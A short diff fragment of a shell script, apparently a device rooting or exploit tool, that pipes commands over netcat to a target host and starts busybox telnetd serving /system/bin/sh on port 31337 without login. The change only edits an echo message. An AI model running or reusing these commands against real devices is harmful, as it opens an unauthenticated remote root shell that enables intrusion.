@@ -11,5 +11,5 @@ fi
 	echo "EOF";
 	echo "chmod +x /dev/busybox"
 	echo "/dev/busybox telnetd -l /system/bin/sh -p 31337";
-	echo "echo done (press Ctrl+C to exit)";
+	echo "echo done: press Ctrl-C to exit";
 ) | nc $1 1337
